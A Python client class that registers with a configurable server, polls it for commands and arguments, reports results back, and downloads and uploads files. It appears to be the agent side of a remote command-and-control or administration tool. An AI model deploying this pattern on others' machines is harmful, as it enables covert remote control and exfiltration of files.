
from os import error
from flask import helpers
import requests
from requests.api import head

class linker:
    def __init__(self):
        self.jwtToken=""
        file=open("serverLink.txt", mode="r")
        for line in file:
            self.addr = line
        file.close()
        self.arg=[]

    def doRequest(self,rote,json,method):
        try:
            addr = self.addr + rote
            if method=="post":
                r = requests.post(addr,headers={"x-auth":self.jwtToken},json=json)
                return [r.json(),r.status_code]

            elif method=="get":
                r=requests.get(addr,headers={"x-auth":self.jwtToken},json=json)
                return [r.json(),r.status_code]
            else:
                print ("[python] method unknown")
                raise method

        except Exception as e:
            print("[python] exception ocurred!",e)
            return False

    def makeRegister(self):

        Return = self.doRequest("register", {"status":"ok"}, "get")

        if (Return==False):
            print("[python] register was not made")
            return False
        
        elif (Return[1]==200):
            print("[python] register was made")
            self.jwtToken=Return[0]["x-auth"]
            return True
        
        else:
            print("[python] Code response Error: " + str(Return[1]))
            return False

    def getCMD(self):
        Return = self.doRequest("getcmd", {"status":"ok"} , "post")
        if (Return==False):
            print("[python] server not found")
            return False
        
        elif (Return[1]==200):
            size=len(Return[0]["cmd"])
            if (size >1):
                index = 1
                while (index  < size ):
                    self.arg.append(Return[0]["cmd"][index])
                    #print (Return[0]["cmd"][index]) #elemento associado
                    index +=1
            c = Return[0]["cmd"][0] #comando do elemento
            print("[python] cmd found:" + c )
            return c
        
        else:
            print("[python] Code response Error: " + str(Return[1]))
            return False
    
    def report(self,input):
        if (type(input) is str):
            json={"response":input} #response é campo do json enviado
            self.doRequest("report",json, "post") #report se refere a rota flask 
        else:
            print("[python] The input is not string.")
    
    def getArgsSize(self):
        return len(self.arg)
    
    def getArgs(self):
        saida = self.arg
        self.arg = []#limpa
        return saida
        
    def clientOK(self):
        print("[python] responding OK")
        Return = self.doRequest("clientOk",{"status":"ok"} ,"post")
        print("Retorno: " + str(Return))
        if (Return==False):
            print("[python] not responded OK... server not found")
        elif (Return[1]==200):
            print("[python] responded OK")
        else:
            print("[python] not responded OK... server not understend")

    def downloadFileFromServer(self,scFile):
        print("[python] downloding " + scFile)
        try : 
            json={"sFile":scFile}
            addr = self.addr + "/receiveFromServer"
            r = requests.get(addr,json=json,headers={"x-auth":self.jwtToken}, allow_redirects=True)
            open(scFile,'wb').write(r.content)
            return r.status_code==200
        
        except Exception as e:
            print("error: " + str(e))
            return False;
    
    def uploadFileFromServer(self,csFile):
        try : 
            print("[python] uploading " + csFile)
            r = requests.post(self.addr + "/sendFile2Server",files={'lFile':open(csFile,'rb')},headers={"x-auth":self.jwtToken}, allow_redirects=True)
            return r.status_code==200
            
        except Exception as e:
            print("error: " + str(e))
            return False;
link=linker()

